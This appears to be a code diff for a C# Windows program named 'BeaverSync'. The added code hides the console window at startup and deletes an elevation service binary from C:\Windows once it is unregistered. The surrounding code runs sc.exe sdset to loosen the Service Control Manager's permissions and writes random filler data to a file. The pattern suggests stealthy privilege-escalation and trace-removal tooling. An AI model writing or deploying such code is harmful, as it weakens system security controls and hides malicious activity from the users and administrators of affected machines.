@@ -7,16 +7,29 @@ using System.ServiceProcess;
 using VoidSerpent;
 using System.Collections.Generic;
 using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 
 namespace BeaverSync
 {
     internal class Program
     {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool AllocConsole();
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        private const int SW_HIDE = 0;
+
         private static DatabaseManager db;
 
         //[STAThread]
         static void Main(string[] args)
         {
+            HideConsoleWindow();
             /* not working, need more time to debug
             if (!BetrayalIsASymptom.protectedStart())
             {
@@ -135,12 +148,14 @@ namespace BeaverSync
                     string[] regcmd = { "sdset", "scmanager", "D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)(A;;CC;;;S-1-15-3-1024-528118966-3876874398-709513571-1907873084-3598227634-3698730060-278077788-3990600205)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)" };
                     RunCmd("sc.exe", regcmd, false);
 
-                    //string[] dgcmd = { "delete", "bvSyncService" };
-                    //RunCmd(process: "sc.exe", args: dgcmd);
-
                     // unregister the elevation service
                     string[] uninst = { "/u", @"C:\Windows\BeaverElevateService.exe" };
                     RunCmd("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", uninst, false);
+                    string beavSvc = @"C:\Windows\BeaverElevateService.exe";
+                    if (File.Exists(beavSvc))
+                    {
+                        File.Delete(beavSvc);
+                    }
 
                     // remove compfile if exists
                     string beavered = @"C:\ProgramData\BeaverSynced";
@@ -219,6 +234,15 @@ namespace BeaverSync
                 Random rnd = new Random();
                 rnd.NextBytes(dummyData);
                 await fs.WriteAsync(dummyData, 0, dummyData.Length);
+            }
+        }
+
+        private static void HideConsoleWindow()
+        {
+            IntPtr hWnd = GetConsoleWindow();
+            if (hWnd != IntPtr.Zero)
+            {
+                ShowWindow(hWnd, SW_HIDE);
             }
         }
     }
